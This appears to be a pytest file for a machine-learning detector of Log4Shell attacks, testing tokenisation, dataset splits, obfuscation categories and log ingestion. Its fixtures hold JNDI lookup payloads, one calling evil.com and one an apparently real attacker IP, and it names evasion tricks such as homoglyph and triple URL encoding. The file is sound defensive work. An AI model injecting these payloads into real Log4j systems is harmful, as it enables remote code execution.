import pandas as pd
import pytest

from detector.dataset import DATASET_SCHEMA, validate_schema
from detector.external_ingest import extract_log4shell_observation, is_header_like
from detector.features import CharTokenizer, signal_vector
from detector.paths import PROCESSED_DATA_DIR


def test_schema_validation_accepts_required_columns():
    df = pd.DataFrame([{column: "" for column in DATASET_SCHEMA}])
    df["label"] = 0
    validate_schema(df)


def test_char_tokenizer_encodes_fixed_length():
    tokenizer = CharTokenizer.fit(["abc", "${jndi:ldap://x/a}"], max_len=8)
    encoded = tokenizer.encode_one("abc")
    assert encoded.shape == (8,)
    assert encoded[0] != 0
    assert encoded[-1] == 0


def test_signal_vector_has_expected_dimension():
    vector = signal_vector("${jndi:ldap://evil.com/a}")
    assert vector.ndim == 1
    assert vector.sum() >= 3


def test_unseen_split_does_not_leak_when_dataset_exists():
    train = PROCESSED_DATA_DIR / "train.csv"
    unseen = PROCESSED_DATA_DIR / "unseen_obfuscation_test.csv"
    if not train.exists() or not unseen.exists():
        pytest.skip("processed datasets not generated")
    train_df = pd.read_csv(train)
    unseen_df = pd.read_csv(unseen)
    train_types = set(train_df["obfuscation_type"].astype(str))
    unseen_markers = {"nested_lookup", "env_fallback", "fragmented_tokens", "double_url_encoded", "unicode_escape"}
    assert not (train_types & unseen_markers)
    assert set(unseen_df["label"]) == {1}


def test_adversarial_evasion_split_exists_when_dataset_generated():
    adversarial = PROCESSED_DATA_DIR / "adversarial_evasion_test.csv"
    if not adversarial.exists():
        pytest.skip("processed datasets not generated")
    df = pd.read_csv(adversarial)
    assert len(df) > 0
    assert set(df["label"]) == {1}
    assert {"zero_width_jndi", "homoglyph_jndi", "triple_url_encoded"} & set(df["obfuscation_type"].astype(str))


def test_validation_split_contains_hard_negatives_when_dataset_generated():
    val = PROCESSED_DATA_DIR / "val.csv"
    if not val.exists():
        pytest.skip("processed datasets not generated")
    df = pd.read_csv(val)
    hard_negative_types = {
        "benign_encoded_search_query",
        "benign_documentation_example",
        "benign_unit_test_fixture",
        "benign_json_escaped_payload",
    }
    assert hard_negative_types & set(df["obfuscation_type"].astype(str))
    assert 0 in set(df["label"])


def test_external_ingest_rejects_csv_header_and_extracts_payload():
    header = '"@timestamp","@version","_id","_index","_score","_type","headers.user-agent"'
    assert is_header_like(header)
    assert extract_log4shell_observation(header) is None

    row = '2021-12-15T16:12:36Z",1,"abc","logstash",,"_doc","${jndi:ldap://162.55.90.26/a}"'
    observation = extract_log4shell_observation(row)
    assert observation is not None
    assert "${jndi:ldap://162.55.90.26/a}" in observation
    assert "@timestamp" not in observation
